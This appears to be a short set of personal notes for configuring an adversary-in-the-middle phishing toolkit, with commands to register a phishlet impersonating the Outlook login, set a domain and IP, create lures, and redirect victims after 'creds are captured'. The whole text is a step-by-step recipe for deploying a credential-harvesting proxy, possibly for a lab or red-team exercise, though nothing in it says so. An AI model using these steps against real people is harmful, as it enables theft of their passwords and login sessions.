{phish_sub: 'application', orig_sub: 'application', domain: 'actualdomain.com', session: true, is_landing: true, auto_filter: true}
auto_filter: true   <<  attempts to make filters automatically

phishlet hide outlook

config redirect_url https://www.google.com                  < on error 
lures edit 0 redirect_url https://idm.hak.loc/app/UserHome   < finishes login


config
config domain j0n.cc
config ipv4 54.215.138.229
config redirect_url https://outlook.com
config redirect_url https://login.live.com


For NEW Phishlets do this
1. add new phishlet to /phishlets directory
2. phishlets hostname outlook j0n.cc
3. phishlets enable outlook  < TLS will fail initially 
4. lures create mo 
    lures
5. lures get-url [number]
6. lures edit path 5 mo
    https://mo-idp.j0n.cc/mo
   lures edit 3 redirect_url https://sub.actualdomain.com   << where user is directed after creds are captured
7. config redirect_url https://actualdomain.com
